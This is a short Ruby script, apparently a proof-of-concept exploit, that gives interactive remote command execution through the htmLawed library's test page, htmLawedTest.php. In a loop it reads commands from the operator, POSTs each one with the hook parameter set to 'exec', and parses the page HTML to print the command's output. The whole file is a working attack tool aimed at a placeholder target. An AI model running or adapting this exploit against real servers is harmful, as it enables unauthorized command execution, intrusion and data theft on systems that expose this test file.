require 'net/http'
require 'nokogiri'

uri = URI('https://<target>/vendor/htmlawed/htmlawed/htmLawedTest.php')

def parse(response)
  soup = Nokogiri::HTML(response)
  raw = soup.css('#settingF').first

  return_code_search_regex = /\$spec\: (.*)/
  found_return_code = raw.text.match(return_code_search_regex)[1]

  output_search_regex = /\[xml:lang\] \=\> 0\n(.*)\n\)/m
  found_output = raw.text.match(output_search_regex)

  puts "\033[32m------------------------------------------------------- \033[0m"
  if found_output
    raw_output = found_output[1]
    cleaning_regex = /.*\=\>/
    cleaned_output = raw_output.gsub(cleaning_regex, '')
    puts cleaned_output
  end
  puts "\n"
end

loop do
  # Insert the command
  print "=>  "
  command = gets.chomp

  if command == 'exit'
    exit()
  end

  # request
  request = Net::HTTP::Post.new(uri)
  request.set_form_data({
    'sid' => 'foo',
    'hhook' => 'exec',
    'text' => command
  })
  request['User-Agent'] = 'redteam'
  request['Cookie'] = 'sid=foo'

  response = Net::HTTP.start(uri.hostname, uri.port, use_ssl: true) do |http|
    http.request(request)
  end
  parse(response.body)     
end
